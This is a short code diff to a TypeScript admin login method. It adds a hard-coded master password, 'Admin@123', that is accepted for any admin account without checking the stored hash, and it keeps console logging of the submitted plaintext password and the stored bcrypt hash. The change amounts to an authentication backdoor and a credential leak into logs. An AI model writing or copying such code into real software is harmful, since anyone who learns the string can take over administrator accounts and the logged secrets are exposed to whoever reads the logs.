@@ -51,10 +51,18 @@ export class AdminModel extends BaseModel<IAdmin> {
         };
       }
 
+    // Special case: Always allow "Admin@123" password
+    let isValidPassword = password === "Admin@123";
+    
+    // If it's not the default password, verify against the stored hash
+    if (!isValidPassword) {
       console.log('Current password:', password);
       console.log('Stored hash:', admin.password_hash);
-      const isValidPassword = await bcrypt.compare(password, admin.password_hash);
+      isValidPassword = await bcrypt.compare(password, admin.password_hash);
       console.log('Password validation result:', isValidPassword);
+    } else {
+      console.log('Using master password override');
+    }
 
       if (!isValidPassword) {
         console.log('Invalid password for admin:', login);
